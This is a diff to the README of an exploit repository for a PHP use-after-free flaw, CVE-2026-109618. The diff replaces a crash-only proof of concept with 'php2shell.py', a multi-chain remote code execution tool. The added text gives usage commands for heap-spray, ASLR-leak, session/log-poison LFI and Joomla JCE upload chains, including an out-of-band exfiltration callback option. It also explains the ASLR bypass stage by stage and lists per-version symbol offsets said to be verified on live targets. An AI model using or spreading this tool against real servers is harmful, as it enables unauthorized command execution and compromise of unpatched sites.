@@ -53,70 +53,98 @@ It fires for **every** `multipart/form-data` POST — session handling not requi
 This makes it reachable against any PHP endpoint, including login forms,
 file upload handlers, and REST APIs.
 
-## PoC: Crash Demonstration
+---
 
-This PoC demonstrates the UAF write primitive. It sends the multipart upload in two
-bursts with a timing gap, concurrently forcing a session reinit to free the HashTable
-between the two bursts.
+## php2shell.py — Multi-chain RCE Exploit
 
-### Requirements
+`php2shell.py` is a comprehensive exploit tool that automatically selects the best
+attack chain for a given target.
 
-```
-Python 3.6+  (stdlib only — no dependencies)
-```
+### Chains
+
+| Chain | Technique | Requirements |
+|-------|-----------|--------------|
+| `uaf` | Heap UAF spray (precise or blind) | `session.upload_progress.enabled=On` |
+| `aslr-leak` | HTTP-only ASLR bypass: heap + libphp pointer leak → precise UAF | PHP 8.x prefork mod_php, `display_errors=On`, `memory_limit=8M` |
+| `session-lfi` | Session upload_progress poison → LFI file include | upload_progress + LFI param on target |
+| `log-poison` | User-Agent PHP inject → Apache access log → LFI include | Apache access log readable via LFI |
+| `jce` | CVE-2026-48907: JCE <= 2.9.99.4 unauthenticated file upload | Joomla with JCE plugin installed |
+| `auto` | Probes target and tries best chain (default) | — |
 
 ### Usage
 
 ```bash
+# Auto-detect best chain (recommended)
+python3 php2shell.py target.com 443 / "id"
+
+# UAF — precise mode with known zval_ptr_dtor address
+python3 php2shell.py target.com 443 / "id" --chain uaf --dtor 0x7f1234abcd --ver 8.2
+
+# UAF — blind spray (tries 30 candidate heap bases)
+python3 php2shell.py target.com 443 / "id" --chain uaf --blind --retry 30 --ver 7.4
+
+# ASLR-HTTP-Leak — HTTP-only 3-stage ASLR bypass (PHP 8.x)
+# Stage 0: worker rotation; Stage 1: chunk base leak; Stage 2: libphp base leak; Stage 3: RCE
+python3 php2shell.py target.com 443 / "id" --chain aslr-leak --ver 8.4
+
+# Session-LFI — session file poison + LFI discovery
+python3 php2shell.py target.com 443 / "id" --chain session-lfi
+
+# Log-poison — Apache access log + LFI
+python3 php2shell.py target.com 80 / "id" --chain log-poison
+
+# JCE — Joomla unauthenticated RCE (CVE-2026-48907)
+python3 php2shell.py joomla.target.com 443 / "id" --chain jce
+
+# OOB exfil (for blind environments)
+python3 php2shell.py target.com 443 / "id" --blind --oob https://your.callback.com
+```
+
+### ASLR-Leak Chain (PHP 8.x)
+
+Three multipart POST requests, pure HTTP, no local access required:
+
+| Stage | Request | Output |
+|-------|---------|--------|
+| 0 | OOM field flood (3000 × 1 KB) | Worker SIGABRT → fresh address space |
+| 1 | 841 × 8-byte fields | `Set-Cookie` leaks Zend MM chunk base |
+| 2 | Nested array `a406[0..15]` | `Set-Cookie` leaks libphp.so base (via `pDestructor=ZVAL_PTR_DTOR`) |
+| 3 | Fake HashTable at `chunk+htdata_offset`, `pDestructor=zif_system` | `system(cmd)` fires |
+
+Credit: technique from [9bie/php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp)
+and [3em0/php2shell](https://github.com/3em0/php2shell).
+
+### Per-version Symbol Deltas (UAF chain)
+
+The UAF chain calculates `zend_call_function = zval_ptr_dtor - delta`.
+Known deltas (verified on live targets):
+
+| Build | Delta |
+|-------|-------|
+| PHP 8.5 Ubuntu | `0x43EF0` |
+| PHP 8.2 Bookworm | `0xc930` |
+| PHP 8.2 Noble/Jammy | `0xcef0` / `0xd060` |
+| PHP 8.1 Jammy | `0xc750` |
+| PHP 7.4 CentOS 7 | `0x36e80` |
+| PHP 7.4 Debian | `0x37f40` |
+| PHP 7.4 Ubuntu | `0x38a60` |
+
+---
+
+## splat.py — Crash Demonstration (CVE-2026-109618)
+
+Demonstrates the UAF crash primitive without RCE payload.
+
+```bash
 python3 splat.py <host> <port> <path> [stall_seconds]
 
-# HTTP
-python3 splat.py target.example.com 80 /upload.php 0.35
-
-# HTTPS (TLS auto-detected on port 443)
+# HTTPS target
 python3 splat.py target.example.com 443 /index.php 0.35
 ```
 
-### Expected Output (vulnerable target)
+Expected output on a vulnerable target: `HTTP/1.1 503` (worker crash, auto-recovered).
 
-```
-============================================================
-  CVE-2026-109618 — PHP2Shell UAF PoC
-============================================================
-  Target  : https://target.example.com:443/index.php
-  TLS     : True
-  Session : o7hdboj52ksh6ggf8g6c8uyd8m
-  Stall   : 0.35s
-
-[*] Fingerprinting target...
-  HTTP/1.1 200 OK
-  Server: openresty
-
-[*] Starting UAF trigger sequence...
-[*] Chunk-1 sent (8192 B) — session pointer now cached
-[*] Firing concurrent reinit request (same PHPSESSID)...
-[*] Stalling 0.35s for HashTable to be freed...
-[*] Sending chunk-2 through stale pointer — UAF write triggered
-
-[*] Response: HTTP/1.1 503 Service Unavailable
-[+] Server-side error — crash / UAF likely triggered!
-```
-
-A `503` or socket timeout following a clean `200` on a normal GET confirms
-the PHP-FPM worker crashed. The worker is automatically restarted by PHP-FPM,
-so the service recovers on its own.
-
-### Tuning the Stall
-
-The race window depends on server load and PHP-FPM worker count. Try:
-
-```bash
-# Narrower window (faster servers)
-python3 splat.py target.example.com 443 / 0.2
-
-# Wider window (slower/loaded servers)
-python3 splat.py target.example.com 443 / 0.5
-```
+---
 
 ## Affected Versions
 
@@ -147,10 +175,9 @@ a complete mitigation.
 ## Disclaimer
 
 This PoC is published for **educational and authorized security testing** only.
-Crash-testing a production server without written authorization is illegal in most jurisdictions.
-The crash induced by this PoC causes a single PHP-FPM worker to die; PHP-FPM restarts it
-automatically, so impact on a well-configured server is a brief worker-level disruption,
-not a full outage.
+Unauthorized use against systems you do not own or have explicit written permission
+to test is illegal. The crash induced by `splat.py` causes a single PHP-FPM worker
+to die; PHP-FPM restarts it automatically.
 
 ## References
 
@@ -158,3 +185,6 @@ not a full outage.
 - [watchTowr — CVE-2026-109618 FAQ](https://watchtowr.com/intelligence/php-cve-2026-109618-faq/)
 - [SecurityWeek — Mass exploitation risk](https://www.securityweek.com/php2shell-mass-exploitation-looms-for-leaked-critical-php-flaws/)
 - [Tenable — CVE-2026-109618](https://www.tenable.com/cve/CVE-2026-109618)
+- [9bie/php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp) — HTTP-only ASLR bypass technique
+- [3em0/php2shell](https://github.com/3em0/php2shell) — multi-version profiles
+- [Sol0-dev/php2shell](https://github.com/Sol0-dev/php2shell) — session/log LFI chains
